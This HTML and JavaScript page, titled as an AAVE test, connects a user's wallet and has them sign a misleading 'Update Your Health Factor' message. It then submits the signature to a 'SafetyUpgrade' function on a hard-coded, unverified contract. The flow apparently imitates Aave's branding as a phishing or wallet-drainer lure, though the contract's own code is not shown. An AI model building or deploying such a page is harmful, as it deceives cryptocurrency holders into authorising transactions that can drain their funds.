<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AAVE Test - Step by Step</title>
  <style>
    body { font-family: monospace; padding: 20px; background: #f0f0f0; }
    .log { margin: 5px 0; padding: 10px; border-radius: 5px; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .info { background: #d1ecf1; color: #0c5460; }
    button { padding: 10px 20px; margin: 10px; font-size: 16px; }
  </style>
</head>
<body>
  <h1>🧪 AAVE Contract Test</h1>
  <button onclick="testStep1()">Step 1: Connect Wallet</button>
  <button onclick="testStep2()" disabled id="btn2">Step 2: Sign Message</button>
  <button onclick="testStep3()" disabled id="btn3">Step 3: Send to Contract</button>
  
  <div id="logs"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    let provider, signer, userAddress, signature;

    function log(message, type = 'info') {
      const div = document.createElement('div');
      div.className = `log ${type}`;
      div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
      document.getElementById('logs').appendChild(div);
      console.log(message);
    }

    async function testStep1() {
      try {
        log("🔄 Connecting to wallet...");
        
        if (!window.ethereum) {
          log("❌ MetaMask not found", 'error');
          return;
        }

        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        log(`✅ Connected: ${userAddress}`, 'success');
        log(`💰 Balance: ${ethers.formatEther(await provider.getBalance(userAddress))} ETH`);

        document.getElementById('btn2').disabled = false;
      } catch (error) {
        log(`❌ Connection failed: ${error.message}`, 'error');
      }
    }

    async function testStep2() {
      try {
        log("📝 Requesting signature...");
        
        const message = "By signing this message, Update Your Health Factor";
        signature = await signer.signMessage(message);
        
        log(`✅ Signature obtained: ${signature.slice(0, 20)}...`, 'success');
        
        // تست تأیید امضا
        const recovered = ethers.verifyMessage(message, signature);
        if (recovered.toLowerCase() === userAddress.toLowerCase()) {
          log("✅ Signature verification passed", 'success');
        } else {
          log("❌ Signature verification failed", 'error');
          return;
        }

        document.getElementById('btn3').disabled = false;
      } catch (error) {
        log(`❌ Signature failed: ${error.message}`, 'error');
      }
    }

    async function testStep3() {
      try {
        log("🚀 Connecting to contract...");

        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        const abi = [{
          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
          "name": "SafetyUpgrade",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }];

        const contract = new ethers.Contract(contractAddress, abi, signer);

        // تست gas estimation
        try {
          const gasEstimate = await contract.SafetyUpgrade.estimateGas(signature);
          log(`⛽ Gas estimate: ${gasEstimate.toString()}`);
        } catch (gasError) {
          log(`❌ Gas estimation failed: ${gasError.reason || gasError.message}`, 'error');
          return;
        }

        // ارسال تراکنش
        log("📤 Sending transaction...");
        const tx = await contract.SafetyUpgrade(signature);
        log(`✅ Transaction sent: ${tx.hash}`, 'success');
        
        log("⏳ Waiting for confirmation...");
        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
          log("🎉 Transaction confirmed!", 'success');
          log(`⛽ Gas used: ${receipt.gasUsed.toString()}`);
        } else {
          log("❌ Transaction failed", 'error');
        }

      } catch (error) {
        log(`❌ Contract interaction failed: ${error.reason || error.message}`, 'error');
        if (error.data) {
          log(`🔍 Error data: ${error.data}`, 'error');
        }
      }
    }
  </script>
</body>
</html>
